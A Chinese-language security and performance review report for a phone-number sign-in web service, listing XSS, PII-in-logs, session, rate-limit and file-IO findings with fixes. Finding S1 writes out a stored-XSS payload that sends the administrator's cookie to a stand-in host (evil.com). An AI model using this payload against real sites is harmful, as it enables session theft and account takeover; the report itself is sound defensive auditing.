# 对抗性审查报告：安全 + 性能（2026-08-12）

> 审查基准：`server-web` 分支 v0.13.6（已部署生产）。工作区初始在旧分支 `fix/web-security`（0.9.7），审查前已切换。
> 用户决策：先出报告再修；本轮不做易班密码加密存储；性能优化全部评估。
> 三份探索报告基于 0.9.7 生成，本报告在 0.13.6 上逐项回验 + 0.13.x 增量专项。

---

## 一、安全发现

### 高危（必须修复）

#### S1. `display_name` JS 上下文注入（存储型 XSS）
- **位置**：`web/templates/index.html:929, 1009, 1012, 1051`
- **描述**：4 处 `confirm()` / `prompt()` 模板字面量直接拼接用户可控的账号名称：
  ```js
  confirm(`确定彻底删除「${a.display_name}」(${maskPhone(a.phone)}) 吗？...`)
  ```
  `display_name` 来自普通用户提交的账号 `name` 字段（后端仅限长度 ≤50，`web/app.py:288-289`，无内容过滤）。模板字面量中 `${...}` 会被当作 JS 表达式执行。0.13.5 脱敏只处理了 phone，未覆盖 display_name。
- **攻击路径**：普通用户提交名称 = `` ${fetch('//evil.com/'+btoa(document.cookie))} ``（≤50 字符）→ 管理员在账号管理页点击该账号的「通过/拒绝/删除/彻底删除」→ 恶意代码在**管理员浏览器会话**中执行 → 可调用任意 `/api/*`（读取全部账号/用户、提权自身为管理员）。
- **建议**：新增 `jsEscape()`（转义 `\` `` ` `` `${` `$` 与 `${` 序列），4 处模板字面量插值全部包裹；或改用字符串拼接。同时后端对 `name` 字段增加内容校验（禁止 `${`/反引号，或整体转义策略）。

#### S2. 签到日志与 Web 日志含完整手机号/邮箱
- **位置**：
  - `scripts/signin.py:383, 391, 433, 479, 532, 561, 637, 725, 798, 827, 833` — 日志行 `[{phone}] ✅ 签到成功` 格式，`[phone]` 前缀完整手机号
  - `web/app.py:873, 981, 1002, 1028, 1160, 1249` — `logger.info` 直接记录完整 phone；`:697, 823, 1451, 1474` 记录完整 email
  - `web/templates/index.html:840` — 日志面板 `data.logs.join('\n')` 整块展示（管理员可见所有账号手机号+状态关联）
- **影响**：日志文件（sign.log / web 日志）泄露 = 全量手机号泄露；管理员日志面板即手机号清单。
- **注意**：sign.log 的 `[phone]` 是 `parse_sign_log`（`web/app.py:117-134`，`STATE_RE` 正则）解析签到状态的**依赖**，不可直接脱敏文件内容。
- **建议**：sign.log 保持完整（内部解析依赖）；**Web 日志面板展示层脱敏**（前端渲染日志前对 `[11位手机号]` 应用 mask）；`web/app.py` 的 `logger.info` 手机号/邮箱改为脱敏或省略（管理日志不需要完整号）。

#### S3. 日历组件 DOM id / data-phone 含完整手机号
- **位置**：`web/templates/index.html:1603, 1626`（`id="cal-wrap-{phone}"`）、`:1665`（`id="cal-grid-{phone}"`）、`:1661, 1662, 1689`（`data-phone`）；`web/templates/user.html` 同模式（日历翻页/点击）
- **描述**：完整手机号嵌入 DOM id 与属性，可通过 CSS 选择器 `[id^="cal-wrap-"]` 批量枚举全部手机号；页面源码可见。
- **建议**：日历组件改用账号 `index` 作为 DOM id 键（管理后台可用 index；用户页用 owner 内部 id），`data-phone` 保留（操作传参需要）但 id 脱敏；或引入内存映射 `phone → 序号`。

#### S4. 用户管理完整邮箱展示
- **位置**：`web/templates/index.html:1497`（列表单元格完整邮箱 + `title` 悬停）、`:1503`（`data-email` 完整属性）；`web/app.py:1316`（`api_users` 返回完整 `email`）
- **描述**：邮箱为 PII，管理员列表完整展示 + DOM 属性可查 + API 网络层明文。
- **建议**（待用户决策）：显示层脱敏（如 `ad***@example.com`，保留域名）或保持完整——管理员需靠邮箱识别用户，权衡后定；`data-email` 属性建议移入 JS 内存 map（`index → email`）减少 DOM 面。

### 中危

#### S5. API 传输层完整手机号 / owner 邮箱
- **位置**：`web/app.py:282-300`（`mask_account` 返回完整 `phone`、`owner` 完整邮箱）；`:1305-1330`（`api_users` 完整 email）
- **描述**：前端展示已脱敏（0.13.5/0.13.6），但 `/api/accounts`、`/api/users` 响应体仍含完整手机号/邮箱——Network 面板/抓包可见。手动签到、编辑表单、批量操作确实需要完整号（操作可用性 vs 隐私的权衡）。
- **建议**（待用户决策）：方案 A 保持现状（前端已脱敏展示，接受网络层可见，标注风险）；方案 B 列表接口返回脱敏号 + 新增 `/api/accounts/<idx>/full` 详情接口供编辑/签到按需获取完整号（改动中等）。

#### S6. 内置管理员改密后旧会话仍有效
- **位置**：`web/app.py:1279-1290`（`_effective_role` 对内置管理员短路，不校验 `pw_version`）
- **描述**：注册用户改密/被重置后旧 session 立即失效（pw_version 递增）；内置管理员（.env）改密后旧 cookie 最长 30 天有效（`PERMANENT_SESSION_LIFETIME`）。
- **建议**：内置管理员登录时把 `pw_version` 记入 session；改密接口（`:707-745` 附近）递增一个持久化版本值（写入 `.env` 或独立键），`_effective_role` 对内置管理员同样校验。

#### S7. 登录接口无分级限速
- **位置**：`web/app.py:70-72`（全局 60 次/10s/IP）、`api_login` 失败锁定（`:607-612` 已有，按 (IP, username)）
- **描述**：登录接口与普通接口共用全局限速，脚本化密码喷洒难以遏制（失败锁定按用户名三元组，可被随机用户名绕过）。
- **建议**：登录/注册接口单独限速（如 10 次/分钟/IP），且对不存在用户名也做等时校验（防时序侧信道，`L4` 一并处理）。

#### S8. 注册接口邮箱枚举
- **位置**：`web/app.py:686`（`"该邮箱已注册"`）
- **建议**：错误消息统一为「注册失败」+ 固定延迟；或加注册限速。

#### S9. 管理员添加账号时临时密码明文返回
- **位置**：`web/app.py:801-823`
- **描述**：管理员为未注册邮箱添加账号时自动注册用户，临时密码（`token_urlsafe(8)`）明文出现在 API 响应与日志中；经浏览器历史/代理日志可见。
- **建议**：改为管理员自行设置初始密码（表单新增字段），或返回一次性「设置密码」token（使用后失效）。

#### S10. 无 TLS（部署层）
- **位置**：`web/app.py:430-433`（无 `SESSION_COOKIE_SECURE`）；公网 `http://IP:17892` 直连
- **描述**：HTTP 明文传输（session cookie / 登录密码 / 账号信息）；`Secure` cookie 在无 HTTPS 时无意义。
- **建议**：部署层引入 TLS（自签证书 + 浏览器信任，或反代），届时开启 `SESSION_COOKIE_SECURE=True` + 代理 IP 感知（`X-Forwarded-For`）。本轮仅标注，不改代码。

### 低危

#### S11. SECRET_KEY 无轮换机制
- `web/app.py:180-195`（`ensure_secret_key` 仅缺失时生成）。建议：改密操作时顺带轮换（或文档化手动轮换流程）。

#### S12. `owner_display` 邮箱前缀关联泄露
- `web/app.py:252-256` + `index.html:906/955`（归属列显示邮箱前缀）。低（前缀 + 完整号均在 API 可见时信息量有限）。

### 已确认安全（0.9.7 报告项在 0.13.6 的后续状态）
| 0.9.7 项 | 状态 |
|---|---|
| H2 `.env` 提交仓库含弱密码 | ✅ 已修复（`.gitignore` 含 `.env`；`git ls-files` 无 `.env`，仅 `.env.example`） |
| H1 密码明文存储 | ⏸ 用户确认本轮不做，置后续专项 |
| 登录 CSRF / 会话固定 / 失败锁定 / 主管理员校验 / 批量接口管理员守卫 / 软删除越权 | ✅ 验证通过（`require_login` 全覆盖、`session.clear()`、`(IP,username)` 锁定、批量/软删除接口均在管理员守卫内） |
| 前端 esc() 覆盖 / 公告 textContent / 菜单 DOM API / localStorage 无敏感数据 | ✅ 验证通过 |

---

## 二、性能发现

### 高

#### P1. 日历接口每月 30 次文件 IO
- **位置**：`web/app.py:1178-1187`（`api_my_calendar` 循环 `days_in_month` 次：每次 `os.path.exists` + `open` + `json.load`）
- **描述**：一次日历请求 = 约 30 次磁盘 stat + 30 次 JSON 解析。多用户并发查看日历放大。
- **建议**：改为单次目录扫描（`os.scandir(state_dir)` 一次遍历当天文件）或聚合缓存（按 (year, month) 缓存当日结果，写日志后失效）。

### 中

#### P2. `_my_account_view` 双重解析日志
- **位置**：`web/app.py:1091-1092`（连续两次 `parse_sign_log(LOG_FILE)`：各做一次 `_tail_lines` 读盘 + 全文正则）
- **建议**：单次解析，结果同时用于 states 与 recent。

#### P3. 添加账号时锁内执行密码哈希
- **位置**：`web/app.py:791`（`with _file_lock`）→ `:817`（`generate_password_hash`，scrypt ~100ms）
- **描述**：持全局锁期间执行哈希，所有其他请求（含 10s 轮询）排队等待。
- **建议**：哈希移出锁（先哈希后加锁写盘）；锁内只保留文件读写。

#### P4. accounts.json 零内存缓存
- **位置**：`web/app.py:215-218`（`load_accounts` 每次全量 `json.load`）；前端 10s 轮询 `/api/accounts`（`index.html:1134`）
- **描述**：每在线用户每 10s 读盘一次；多用户并发放大。
- **建议**：读多写少模式——启动/首次加载缓存，写操作（增删改/批量/审核）后失效重载；`RLock` 保护缓存一致性。

#### P5. 10s 轮询全量重建表格 DOM
- **位置**：`web/templates/index.html:1134`（`refreshAccountsSilent`）→ `:857`（`tbody.innerHTML=''` 全量重建）
- **描述**：每 10s 重建整个账号表；账号 >50 行时低配设备卡顿（DOM 重建 + reflow）。
- **建议**：条件渲染——仅状态/数据变化时重建（对比 `state.states` 或维护轻量指纹）；或日志轮询与表格刷新解耦（表格仅在可见且有变化时刷新）。

#### P6. 日历重复 DOM id（功能 bug）
- **位置**：`web/templates/index.html:1603, 1626`（`renderMine` 对同一 phone 插入两个 `cal-wrap-{phone}`）
- **描述**：`$('cal-wrap-'+phone)` 只取到第一个（空壳），日历实际渲染到第二个 div——与 S3 的 id 改造一并修复。
- **建议**：去除重复容器（保留一个），id 改用 index 键。

### 低

#### P7. `/api/users` 双文件读
- `web/app.py:1311-1312`（`load_users` + `load_accounts` 串行两次读盘）→ 单次遍历统计账号数。

#### P8. 更新日志每次点击读盘
- `web/app.py:1609-1610` → 启动时读一次缓存（文件几乎不变）。

#### P9. 静态资源体积
- `tailwind.js` 407KB、`logo.png` 178KB、`fonts/misans/` 6.9MB（woff2 分片按需加载，实际下载少）、`index.html` ~100KB 内联 JS（版本更新时全量重下，无缓存复用）。
- 建议：静态资源加 `Cache-Control` 长缓存（`web_version` 变化时 URL 带参刷新已覆盖更新）；评估 tailwind 构建版（按需生成 CSS，可降至 ~20KB）——改动中等，收益看带宽。

#### P10. 写操作后全量列表重载（无乐观更新）
- 删除/审核/批量后 `loadAccounts()` 全量重载。当前数据量可接受；>100 行时改为局部 DOM 更新。

#### P11. 日志面板整块替换
- `index.html:840`（`textContent` 整块替换 80 行）。可接受，无需处理。

---

## 三、修复分组建议（待确认后执行）

| 组 | 内容 | 涉及 |
|---|---|---|
| **组 1 · 安全高危** | S1 display_name JS 注入；S2 日志手机号脱敏（web logger + 日志面板展示层）；S3 日历 id 脱敏；S4 邮箱显示决策 | index.html、app.py、signin.py（仅展示层） |
| **组 2 · 安全中危** | S6 内置管理员 pw_version；S7 登录限速分级 + 等时校验；S8 注册枚举缓解；S9 临时密码流程优化 | app.py、index.html |
| **组 3 · 性能** | P1 日历聚合读；P2 单次日志解析；P3 哈希移出锁；P4 accounts 缓存；P5 条件渲染；P6 重复 id 修复；P7 users 单读；P8 changelog 缓存 | app.py、index.html |
| **组 4 · 低危** | S5 API 传输方案（待决策）；S11 密钥轮换文档；P9 静态资源缓存头 | app.py、部署 |
| **后续专项** | 易班密码加密存储（用户已确认后续）；TLS 部署 + Secure cookie | 部署 |

## 四、待用户决策项
1. S4 用户管理邮箱：显示层脱敏（ad***@example.com）还是保持完整？
2. S5 API 传输层：保持现状（前端已脱敏）还是新增详情接口方案？
3. 组 1~4 修复范围与顺序确认。
